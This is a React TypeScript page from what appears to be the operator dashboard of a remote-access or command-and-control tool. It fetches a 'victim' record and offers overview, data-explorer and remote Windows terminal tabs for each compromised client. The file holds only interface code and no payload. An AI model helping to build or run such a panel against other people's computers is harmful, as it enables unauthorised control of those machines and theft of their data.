import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import {
  FaAddressCard,
  FaDatabase,
  FaLaptop,
  FaUser,
  FaUserShield,
} from "react-icons/fa";
import { getVictim } from "../../service/api.service";
import Terminal from "../../components/Terminal";
import NotFound from "../404";
import Header from "./sections/Header";
import Details from "./sections/Details";
import ClientOverview from "./sections/ClientOverview";
import SecurityMonitoring from "./sections/SecurityMonitoring";
import DataExplorer from "./sections/DataExplorer";

const Client: React.FC = () => {
  const [tab, setTab] = useState("overview");
  const [client, setClient] = useState<Victim>();
  const location = useLocation();

  useEffect(() => {
    const fetchClient = async () => {
      // Example URL: http://localhost:5173/dashboard/client/1

      // Extract the id from the url
      const id = location.pathname.split("/")[3];

      if (id) {
        const response = await getVictim(id);
        console.log("Response ->", response.data.client);
        await setClient(response.data.client);
      }
    };

    fetchClient();
    console.log(client);
  }, [location.pathname]);

  const tabsAllowed = [
    {
      name: "overview",
      icon: <FaLaptop className="mr-2" />,
      title: "Overview",
    },
    {
      name: "detail",
      icon: <FaUser className="mr-2" />,
      title: "Details",
    },
    {
      name: "security-monitoring",
      icon: <FaUserShield className="mr-2" />,
      title: "Security Monitoring",
    },
    {
      name: "terminal",
      icon: <FaAddressCard className="mr-2" />,
      title: "Terminal",
    },
    {
      name: "data-explorer",
      icon: <FaDatabase className="mr-2" />,
      title: "Data Explorer",
    },
  ];

  return (
    <div className="container mx-auto">
      {client?.computer_name?.length ? (
        <>
          <Header client={client} />

          {/* Tabs */}
          <div className="flex flex-row mt-4 gap-x-2 w-full mx-auto justify-center">
            {tabsAllowed.map((tabAllowed, index) => (
              <button
                key={index}
                onClick={() => setTab(tabAllowed.name)}
                className={`py-2 px-4 border-b-2 hover:border-b-sky-600 rounded-sm flex flex-row items-center ${
                  tab === tabAllowed.name
                    ? "border-b-sky-600 text-sky-600"
                    : "border-b-transparent text-gray-200"
                }`}
              >
                {tabAllowed.icon} {tabAllowed.title}
              </button>
            ))}
          </div>

          {tab === "overview" && <ClientOverview id={client.id} />}

          {tab === "detail" && <Details client={client} />}

          {tab === "security-monitoring" && <SecurityMonitoring />}

          {tab === "terminal" && (
            <div className="mt-4">
              <Terminal id={client.id} currentDirectory={"C:\\Users\\User>"} />
            </div>
          )}

          {tab === "data-explorer" && <DataExplorer />}
        </>
      ) : (
        <NotFound />
      )}
    </div>
  );
};

export default Client;
